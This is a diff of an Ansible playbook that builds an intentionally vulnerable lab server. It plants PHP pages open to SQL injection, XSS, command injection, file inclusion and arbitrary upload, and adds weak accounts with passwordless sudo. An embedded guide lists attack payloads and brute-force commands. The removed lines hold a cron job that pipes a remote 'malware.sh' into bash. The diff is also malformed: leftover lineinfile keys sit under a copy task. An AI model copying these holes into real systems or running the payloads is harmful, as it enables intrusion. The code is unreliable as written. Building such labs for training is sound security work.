@@ -1,13 +1,66 @@
-# D:\ansible-control-node\playbooks\02_introduce_vulnerabilities.yml
 ---
-- name: 02 - Introduce Vulnerabilities and Insecure Configurations
+- name: 02 - Introduce Controlled Vulnerabilities for Penetration Testing
   hosts: vps_lab
-  gather_facts: false
-  
+  gather_facts: yes
+  vars:
+    # Load vulnerability profile (change this to switch profiles)
+    vulnerability_profile: "vulnerable_profile"  # Options: secure_profile, vulnerable_profile, highly_vulnerable_profile
+    mysql_root_password: "CleanLabPassword123!"
+    
   tasks:
-    - name: Vuln 1: Expose Nginx version (Information Disclosure)
-      ansible.builtin.lineinfile:
-        path: /etc/nginx/nginx.conf
+    # ===========================================
+    # INTRODUCE WEB VULNERABILITIES
+    # ===========================================
+    - name: Create vulnerable web pages for testing
+      copy:
+        content: |
+          <?php
+          // VULNERABLE PHP SCRIPT - FOR TESTING ONLY
+          // This script contains intentional vulnerabilities
+          
+          echo "<h1>Vulnerable Test Page</h1>";
+          
+          // SQL Injection vulnerability
+          if (isset($_GET['id'])) {
+              $id = $_GET['id'];
+              $query = "SELECT * FROM users WHERE id = " . $id; // Vulnerable to SQL injection
+              echo "<p>Query: " . $query . "</p>";
+          }
+          
+          // XSS vulnerability
+          if (isset($_GET['name'])) {
+              echo "<p>Hello " . $_GET['name'] . "</p>"; // Vulnerable to XSS
+          }
+          
+          // Command injection vulnerability  
+          if (isset($_POST['ping'])) {
+              $host = $_POST['host'];
+              $output = shell_exec('ping -c 1 ' . $host); // Vulnerable to command injection
+              echo "<pre>" . $output . "</pre>";
+          }
+          
+          // File inclusion vulnerability
+          if (isset($_GET['page'])) {
+              include($_GET['page']); // Vulnerable to LFI/RFI
+          }
+          
+          ?>
+          
+          <h2>Test Forms</h2>
+          <form method="GET">
+              <label>Test XSS: <input type="text" name="name"></label>
+              <input type="submit" value="Submit">
+          </form>
+          
+          <form method="POST">
+              <label>Test Command Injection: <input type="text" name="host" value="127.0.0.1"></label>
+              <input type="hidden" name="ping" value="1">
+              <input type="submit" value="Ping">
+          </form>
+        dest: /var/www/html/vulnerable.php
+        owner: www-data
+        group: www-data
+        mode: '0644'
         regexp: '^\s*#?server_tokens off;'
         line: 'server_tokens on;'
         state: present
@@ -21,10 +74,221 @@
         groups: sudo # Grant unnecessary sudo access
         state: present
         
-    - name: Vuln 3: Add a Vague Cron Job (Potential Persistence/RAT)
-      ansible.builtin.cron:
-        name: "check_updates_bad"
-        job: 'curl -s http://192.168.1.5/malware.sh | bash' # Example of a suspicious external execution
-        minute: "*/5"
-        user: backupman
+    - name: Create vulnerable upload directory
+      file:
+        path: /var/www/html/uploads
+        state: directory
+        owner: www-data
+        group: www-data
+        mode: '0777'  # Intentionally permissive
+
+    - name: Create vulnerable file upload script
+      copy:
+        content: |
+          <?php
+          // VULNERABLE FILE UPLOAD - FOR TESTING ONLY
+          
+          if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+              $target_dir = "uploads/";
+              $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
+              
+              // No file type validation - VULNERABILITY
+              if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+                  echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
+              } else {
+                  echo "Sorry, there was an error uploading your file.";
+              }
+          }
+          ?>
+          
+          <h2>Vulnerable File Upload</h2>
+          <form action="" method="post" enctype="multipart/form-data">
+              <label>Select file to upload:</label>
+              <input type="file" name="fileToUpload" required>
+              <input type="submit" value="Upload File" name="submit">
+          </form>
+          
+          <h3>Uploaded Files:</h3>
+          <?php
+          $files = scandir('uploads/');
+          foreach($files as $file) {
+              if($file != "." && $file != "..") {
+                  echo "<a href='uploads/$file'>$file</a><br>";
+              }
+          }
+          ?>
+        dest: /var/www/html/upload.php
+        owner: www-data
+        group: www-data
+        mode: '0644'
+
+    # ===========================================
+    # WEAKEN SYSTEM SECURITY
+    # ===========================================
+    - name: Create test users with weak passwords
+      user:
+        name: "{{ item.name }}"
+        password: "{{ item.password | password_hash('sha512') }}"
+        shell: /bin/bash
+        create_home: yes
+      loop:
+        - { name: "admin", password: "admin" }
+        - { name: "test", password: "test" }
+        - { name: "guest", password: "guest" }
+        - { name: "user", password: "password" }
+
+    - name: Add weak sudo privileges
+      lineinfile:
+        path: /etc/sudoers
+        line: "{{ item }}"
+        validate: 'visudo -cf %s'
+      loop:
+        - "admin ALL=(ALL) NOPASSWD:ALL"
+        - "test ALL=(ALL) ALL"
+
+    # ===========================================
+    # DATABASE VULNERABILITIES
+    # ===========================================
+    - name: Create vulnerable database with weak credentials
+      mysql_db:
+        name: testdb
         state: present
+        login_user: root
+        login_password: "{{ mysql_root_password }}"
+
+    - name: Create database user with weak password
+      mysql_user:
+        name: testuser
+        password: "testpass"
+        priv: "testdb.*:ALL"
+        host: "%"  # Allow connections from any host - VULNERABILITY
+        state: present
+        login_user: root
+        login_password: "{{ mysql_root_password }}"
+
+    - name: Create vulnerable database table with sample data
+      mysql_query:
+        login_user: root
+        login_password: "{{ mysql_root_password }}"
+        login_db: testdb
+        query: |
+          CREATE TABLE IF NOT EXISTS users (
+            id INT AUTO_INCREMENT PRIMARY KEY,
+            username VARCHAR(50),
+            password VARCHAR(50),
+            email VARCHAR(100),
+            role VARCHAR(20)
+          );
+          
+          INSERT IGNORE INTO users (id, username, password, email, role) VALUES
+          (1, 'admin', 'admin123', 'admin@lab.local', 'admin'),
+          (2, 'john', 'password', 'john@lab.local', 'user'),
+          (3, 'guest', 'guest', 'guest@lab.local', 'guest'),
+          (4, 'test', 'test123', 'test@lab.local', 'user');
+
+    # ===========================================
+    # CONFIGURE VULNERABLE SERVICES
+    # ===========================================
+    - name: Configure Apache with vulnerable settings
+      lineinfile:
+        path: /etc/apache2/apache2.conf
+        regexp: "{{ item.regexp }}"
+        line: "{{ item.line }}"
+      loop:
+        - { regexp: "^ServerTokens", line: "ServerTokens Full" }  # Expose version info
+        - { regexp: "^ServerSignature", line: "ServerSignature On" }  # Show server info in error pages
+      notify: restart apache
+
+    - name: Enable Apache server-info and server-status (information disclosure)
+      copy:
+        content: |
+          <Location "/server-info">
+              SetHandler server-info
+              Require all granted
+          </Location>
+          
+          <Location "/server-status">
+              SetHandler server-status
+              Require all granted
+          </Location>
+        dest: /etc/apache2/conf-available/server-info.conf
+
+    - name: Enable server-info configuration
+      command: a2enconf server-info
+      notify: restart apache
+
+    # ===========================================
+    # CREATE VULNERABILITY DOCUMENTATION
+    # ===========================================
+    - name: Create vulnerability assessment guide
+      copy:
+        content: |
+          ==============================================
+          VULNERABILITY ASSESSMENT LAB GUIDE
+          ==============================================
+          
+          This system has been configured with intentional vulnerabilities
+          for educational and testing purposes.
+          
+          ⚠️  WARNING: This system should NEVER be exposed to the internet!
+          
+          ==============================================
+          INSTALLED VULNERABILITIES:
+          ==============================================
+          
+          Web Application Vulnerabilities:
+          --------------------------------
+          1. SQL Injection: /vulnerable.php?id=1' OR '1'='1
+          2. XSS: /vulnerable.php?name=<script>alert('XSS')</script>
+          3. Command Injection: /vulnerable.php (POST ping form)
+          4. File Upload: /upload.php (accepts any file type)
+          5. Directory Traversal: /vulnerable.php?page=../../../etc/passwd
+          
+          System Vulnerabilities:
+          ----------------------
+          1. Weak User Accounts:
+             - admin:admin (with sudo NOPASSWD)
+             - test:test (with sudo access)
+             - guest:guest
+             - user:password
+          
+          2. Database Vulnerabilities:
+             - testuser:testpass (remote access allowed)
+             - Unencrypted passwords in database
+             - Sample data with weak credentials
+          
+          3. Information Disclosure:
+             - Apache server info: /server-info
+             - Apache server status: /server-status
+             - Full server tokens enabled
+          
+          ==============================================
+          TESTING TOOLS SUGGESTIONS:
+          ==============================================
+          
+          Network Scanning:
+          - nmap -sV -sC {{ ansible_default_ipv4.address }}
+          - nmap -p- {{ ansible_default_ipv4.address }}
+          
+          Web Application Testing:
+          - sqlmap -u "http://{{ ansible_default_ipv4.address }}/vulnerable.php?id=1"
+          - nikto -h {{ ansible_default_ipv4.address }}
+          - dirb http://{{ ansible_default_ipv4.address }}
+          
+          Password Attacks:
+          - hydra -l admin -P passwords.txt ssh://{{ ansible_default_ipv4.address }}
+          - hydra -l testuser -P passwords.txt mysql://{{ ansible_default_ipv4.address }}
+          
+          File Upload Testing:
+          - Upload PHP shell to /upload.php
+          - Access uploaded files at /uploads/
+          
+          ==============================================
+        dest: /root/vulnerability-guide.txt
+        mode: '0644'
+
+  handlers:
+    - name: restart apache
+      systemd:
+        name: apache2
+        state: restarted
